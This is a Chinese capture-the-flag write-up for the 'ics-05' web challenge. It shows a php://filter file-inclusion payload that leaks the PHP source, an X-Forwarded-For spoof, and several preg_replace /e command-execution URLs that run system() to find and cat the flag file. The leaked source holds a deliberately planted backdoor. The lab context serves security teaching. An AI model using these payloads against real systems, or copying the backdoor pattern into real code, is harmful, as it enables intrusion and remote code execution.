# ics-05

## 解题思路：

- 首先打开网页，发现跟 ics-04 和 ics-06 的界面一样，但是题目直接告诉了我们 **“工控云管理系统设备维护中心” 有后门**

- 那就直接打开这个界面，发现空空如也，只有一个复选框可以点，点了也没什么用。打开开发者选项，发现有一个 **?page=index** ，get传参形式获取到page的值

- 考虑是文件包含漏洞([参考资料](https://blog.csdn.net/qq_29419013/article/details/81202358))， 对page进行get：

    `index.php/?page=alsdfjasdlfkjaslf`

    服务器直接把我发出去的page值显示在了屏幕上，说明page确实传过去了。

- 开始利用，构造一个payload传一下我们的命令：

    `index.php?pages=php://filter/read=convert.base64-encode/resource=index.php`

    这里是直接获取了index.php的内容我在第二步时尝试过请求 `/config.php` ，发现该文件不存在。

- 利用payload上传，发现服务器传回了一长串base64编码，放进phpstorm里执行一下解码：

    ```html
    <!DOCTYPE HTML>
    <html>

    <head>
        <meta charset="utf-8">
        <meta name="renderer" content="webkit">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        <link rel="stylesheet" href="layui/css/layui.css" media="all">
        <title>设备维护中心</title>
        <meta charset="utf-8">
    </head>

    <body>
        <ul class="layui-nav">
            <li class="layui-nav-item layui-this"><a href="?page=index">云平台设备维护中心</a></li>
        </ul>
        <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
            <legend>设备列表</legend>
        </fieldset>
        <table class="layui-hide" id="test"></table>
        <script type="text/html" id="switchTpl">
            <!-- 这里的 checked 的状态只是演示 -->
            <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="开|关" lay-filter="checkDemo" {{ d.id==1 0003 ? 'checked' : '' }}>
        </script>
        <script src="layui/layui.js" charset="utf-8"></script>
        <script>
        layui.use('table', function() {
            var table = layui.table,
                form = layui.form;

            table.render({
                elem: '#test',
                url: '/somrthing.json',
                cellMinWidth: 80,
                cols: [
                    [
                        { type: 'numbers' },
                        { type: 'checkbox' },
                        { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
                        { field: 'name', title: '设备名', templet: '#nameTpl' },
                        { field: 'area', title: '区域' },
                        { field: 'status', title: '维护状态', minWidth: 120, sort: true },
                        { field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true }
                    ]
                ],
                page: true
            });
        });
        </script>
        <script>
        layui.use('element', function() {
            var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
            //监听导航点击
            element.on('nav(demo)', function(elem) {
                //console.log(elem)
                layer.msg(elem.text());
            });
        });
        </script>

    <?php

    $page = $_GET[page];

    if (isset($page)) {



    if (ctype_alnum($page)) {
    ?>

        <br /><br /><br /><br />
        <div style="text-align:center">
            <p class="lead"><?php echo $page; die();?></p>
        <br /><br /><br /><br />

    <?php

    }else{

    ?>
            <br /><br /><br /><br />
            <div style="text-align:center">
                <p class="lead">
                    <?php

                    if (strpos($page, 'input') > 0) {
                        die();
                    }

                    if (strpos($page, 'ta:text') > 0) {
                        die();
                    }

                    if (strpos($page, 'text') > 0) {
                        die();
                    }

                    if ($page === 'index.php') {
                        die('Ok');
                    }
                        include($page);
                        die();
                    ?>
            </p>
            <br /><br /><br /><br />

    <?php
    }}


    //方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

    if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

        echo "<br >Welcome My Admin ! <br >";

        $pattern = $_GET[pat];
        $replacement = $_GET[rep];
        $subject = $_GET[sub];

        if (isset($pattern) && isset($replacement) && isset($subject)) {
            preg_replace($pattern, $replacement, $subject);
        }else{
            die();
        }

    }
    ?>

    </body>

    </html>
    ```

- 看到 `if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1')` ，知道要伪造XFF，那我们就伪造一波，用burp suite修改一下请求，加一句：

    `X-Forwarded-For: 127.0.0.1`

    服务器回复，网页下面多了一句：`Welcome My Admin ! `

    成功拿到管理员权限，接下来考虑怎么拿flag：

    看到 `preg_replace()` ，没跑儿了：

        preg_replace( pattern , replacement , subject ) :
        当pre_replace的参数pattern输入/e的时候 ,参数replacement的代码当作PHP代码执行

    于是构造payload：
    
    `/index.php?pat=/test/e&rep=system('find+/+-name+flag.php')&sub=test`

    使用 `find` 来找flag， 中间用 `+` 替换空格，我之前用空格发现服务器报错 400 ，必须用+来避免编解码错误。

    服务器回复：

    `/var/www/html/s3chahahaDir/flag`

    接着构造，直接cat看看能不能拿到flag：

    `/index.php?pat=/test/e&rep=system('cat+/var/www/html/s3chahahaDir/flag')&sub=test`

    发现没东西，再试试ls看看flag是不是文件夹：

    `/index.php?pat=/test/e&rep=system('ls+/var/www/html/s3chahahaDir/flag')&sub=test`

    服务器回应：`flag.php`

    最后用cat拿flag：

    `/index.php?pat=/test/e&rep=system('cat+/var/www/html/s3chahahaDir/flag/flag.php')&sub=test`

    搞定！